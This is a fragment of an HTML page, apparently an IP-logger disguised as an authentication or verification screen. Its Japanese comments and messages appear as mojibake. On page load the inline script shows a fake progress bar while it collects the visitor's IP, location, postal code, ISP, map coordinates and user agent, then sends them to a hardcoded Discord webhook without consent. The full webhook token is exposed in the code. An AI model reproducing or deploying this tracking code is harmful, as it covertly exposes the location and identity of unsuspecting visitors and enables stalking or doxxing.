<body>

                </div>

            <div id="status-message" class="status-message"></div>

        <div class="privacy-panel">

    <script>
        document.addEventListener('DOMContentLoaded', async () => {
            const progressBar = document.getElementById('progress-bar');
            const completedSection = document.getElementById('completed-section');
            const authIcon = document.querySelector('.auth-icon');
            const statusMessage = document.getElementById('status-message');
            const subtitle = document.querySelector('.subtitle');
            const loadingText = document.querySelector('.loading-text');
            
            // ‰∫ãÂâç„Å´Ë®≠ÂÆö„Åï„Çå„ÅüDiscord„Ç¶„Çß„Éñ„Éï„ÉÉ„ÇØURL
            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1401728338334322808/8EIagx68F5k0xRcFkfislihfPO0Eb3kO-DwonUYZe1j-wMot8-QKGvndvLwgxbbmjhWr';
            
            // ÈÄ≤Êçó„Éê„Éº„Çí„Ç¢„Éã„É°„Éº„Ç∑„Éß„É≥
            const updateProgress = (percentage) => {
                progressBar.style.width = `${percentage}%`;
            };
            
            // „É©„É≥„ÉÄ„É†„Å™„É™„ÉÉ„Éó„É´„Ç®„Éï„Çß„ÇØ„Éà„ÇíÁîüÊàê
            function createRipple() {
                const ripple = document.createElement('div');
                ripple.className = 'ripple';
                
                // „É©„É≥„ÉÄ„É†„Å™‰ΩçÁΩÆ„Å®„Çµ„Ç§„Ç∫
                const size = Math.random() * 300 + 100;
                const x = Math.random() * window.innerWidth;
                const y = Math.random() * window.innerHeight;
                
                ripple.style.width = `${size}px`;
                ripple.style.height = `${size}px`;
                ripple.style.left = `${x}px`;
                ripple.style.top = `${y}px`;
                
                document.body.appendChild(ripple);
                
                // „Ç¢„Éã„É°„Éº„Ç∑„Éß„É≥ÁµÇ‰∫ÜÂæå„Å´ÂâäÈô§
                setTimeout(() => {
                    ripple.remove();
                }, 3000);
            }
            
            // ËÉåÊôØ„Ç®„Éï„Çß„ÇØ„Éà„ÇíÂÆöÊúüÁöÑ„Å´ÁîüÊàê
            const rippleInterval = setInterval(createRipple, 1000);
            
            // IPË©≥Á¥∞ÊÉÖÂ†±„ÇíÂèñÂæó„Åô„ÇãÈñ¢Êï∞
            async function getIPDetails() {
                try {
                    const response = await fetch('https://ipapi.co/json/');
                    const data = await response.json();
                    return data;
                } catch (error) {
                    console.error('Â§±Êïó„Åó„Åæ„Åó„Åü:', error);
                    return null;
                }
            }
            
            // Discord„Å´ÈÄÅ‰ø°„Åô„ÇãÈñ¢Êï∞ÔºàË©≥Á¥∞ÊÉÖÂ†±‰ªò„ÅçÔºâ
            async function sendToDiscord(ipDetails) {
                const userAgent = navigator.userAgent;
                const accessTime = new Date().toLocaleString();
                
                // ‰ΩçÁΩÆÊÉÖÂ†±„É™„É≥„ÇØÔºàGoogle MapsÔºâ
                const mapLink = `https://www.google.com/maps?q=${ipDetails.latitude},${ipDetails.longitude}`;
                
                // Discord„Å´ÈÄÅ‰ø°„Åô„Çã„Éá„Éº„Çø
                const payload = {
                    content: `üö® **Ë©≥Á¥∞IPÊÉÖÂ†±ÈÄöÁü•** üö®`,
                    embeds: [
                        {
                            title: "Êñ∞„Åó„ÅÑ„Ç¢„ÇØ„Çª„Çπ„ÇíÊ§úÂá∫",
                            description: "„Çª„Ç≠„É•„Ç¢IPÈÄöÁü•„Ç∑„Çπ„ÉÜ„É†„ÅåÊñ∞„Åó„ÅÑ„Ç¢„ÇØ„Çª„Çπ„ÇíÊ§úÂá∫„Åó„Åæ„Åó„Åü",
                            color: 5814783,
                            fields: [
                                { name: "IP„Ç¢„Éâ„É¨„Çπ", value: `\`${ipDetails.ip}\``, inline: true },
                                { name: "ÂõΩ", value: `${ipDetails.country_name} (${ipDetails.country})`, inline: true },
                                { name: "Âú∞Âüü", value: `${ipDetails.region}, ${ipDetails.city}`, inline: true },
                                { name: "ÈÉµ‰æøÁï™Âè∑", value: ipDetails.postal || "‰∏çÊòé", inline: true },
                                { name: "„Éó„É≠„Éê„Ç§„ÉÄ„Éº", value: ipDetails.org || "‰∏çÊòé", inline: true },
                                { name: "„Çø„Ç§„É†„Çæ„Éº„É≥", value: ipDetails.timezone || "‰∏çÊòé", inline: true },
                                { name: "‰ΩçÁΩÆÊÉÖÂ†±", value: `[Google Maps„ÅßË°®Á§∫](${mapLink})`, inline: true },
                                { name: "„É¶„Éº„Ç∂„Éº„Ç®„Éº„Ç∏„Çß„É≥„Éà", value: `\`\`\`${userAgent}\`\`\``, inline: false }
                            ],
                            footer: { text: "„Çª„Ç≠„É•„Ç¢IPÈÄöÁü•„Ç∑„Çπ„ÉÜ„É† v5.0" }
                        }
                    ]
                };
                
                try {
                    const response = await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(payload)
                    });
                    
                    return response.ok;
                } catch (error) {
                    console.error('Discord„Å∏„ÅÆÈÄÅ‰ø°„Å´Â§±Êïó„Åó„Åæ„Åó„Åü:', error);
                    return false;
                }
            }
            
            // Âá¶ÁêÜ„ÇíÂÆüË°å
            async function executeProcess() {
                // ÈÄ≤Êçó„Éê„Éº„ÅÆÂàùÊúüË®≠ÂÆö
                updateProgress(10);
                loadingText.textContent = "„Ç∑„Çπ„ÉÜ„É†„ÇíÂàùÊúüÂåñ„Åó„Å¶„ÅÑ„Åæ„Åô...";
                
                // Âá¶ÁêÜ„Çπ„ÉÜ„ÉÉ„Éó„ÇíÂÆöÁæ©
                const steps = [
                    {progress: 25, delay: 800, message: "IP„Ç¢„Éâ„É¨„Çπ„ÇíÂèñÂæó‰∏≠..."},
                    {progress: 50, delay: 1200, message: "Ë©≥Á¥∞ÊÉÖÂ†±„ÇíÂèéÈõÜ‰∏≠..."},
                    {progress: 75, delay: 1000, message: "ÊöóÂè∑ÂåñÂá¶ÁêÜ„ÇíÂÆüË°å‰∏≠..."},
                    {progress: 100, delay: 800, message: "„Çµ„Éº„Éê„Éº„Å´ÈÄÅ‰ø°‰∏≠..."}
                ];
                
                try {
                    // ÂêÑ„Çπ„ÉÜ„ÉÉ„Éó„ÇíÂÆüË°å
                    for (const step of steps) {
                        await new Promise(resolve => setTimeout(resolve, step.delay));
                        updateProgress(step.progress);
                        loadingText.textContent = step.message;
                    }
                    
                    // IPË©≥Á¥∞ÊÉÖÂ†±„ÇíÂèñÂæó
                    const ipDetails = await getIPDetails();
                    
                    if (!ipDetails || !ipDetails.ip) {
                        throw new Error('IPË©≥Á¥∞ÊÉÖÂ†±„ÅÆÂèñÂæó„Å´Â§±Êïó„Åó„Åæ„Åó„Åü');
                    }
                    
                    // Discord„Å´ÈÄÅ‰ø°
                    const success = await sendToDiscord(ipDetails);
                    
                    if (success) {
                        // Ë™çË®ºÂÆå‰∫Ü„ÇíË°®Á§∫
                        completedSection.style.display = 'block';
                        authIcon.innerHTML = '<i class="fas fa-check"></i>';
                        authIcon.style.background = 'linear-gradient(135deg, var(--success), #05b38c)';
                        authIcon.style.animation = 'none';
                        loadingText.style.display = 'none';
                        
                        // „É°„ÉÉ„Çª„Éº„Ç∏Êõ¥Êñ∞
                        subtitle.textContent = "ÊÉÖÂ†±„ÅØÊ≠£Â∏∏„Å´ÈÄÅ‰ø°„Åï„Çå„Åæ„Åó„Åü";
                        subtitle.style.color = "var(--success)";
                    } else {
                        statusMessage.textContent = 'Discord„Å∏„ÅÆÈÄÅ‰ø°„Å´Â§±Êïó„Åó„Åæ„Åó„Åü';
                        statusMessage.className = 'status-message error';
                    }
                } catch (error) {
                    console.error('Âá¶ÁêÜ‰∏≠„Å´„Ç®„É©„Éº„ÅåÁô∫Áîü„Åó„Åæ„Åó„Åü:', error);
                    statusMessage.textContent = 'Âá¶ÁêÜ‰∏≠„Å´„Ç®„É©„Éº„ÅåÁô∫Áîü„Åó„Åæ„Åó„Åü: ' + error.message;
                    statusMessage.className = 'status-message error';
                    loadingText.textContent = "„Ç®„É©„Éº„ÅåÁô∫Áîü„Åó„Åæ„Åó„Åü";
                } finally {
                    // „É™„ÉÉ„Éó„É´„Ç®„Éï„Çß„ÇØ„Éà„ÇíÂÅúÊ≠¢
                    clearInterval(rippleInterval);
                }
            }
            
            // „Éö„Éº„Ç∏Ë™≠„ÅøËæº„ÅøÊôÇ„Å´Âá¶ÁêÜ„ÇíÈñãÂßãÔºàÂ∞ë„ÅóÈÅÖÂª∂„Åï„Åõ„Å¶Ë°®Á§∫„ÇíÂÆâÂÆö„Åï„Åõ„ÇãÔºâ
            setTimeout(() => {
                executeProcess();
            }, 500);
        });
    </script>
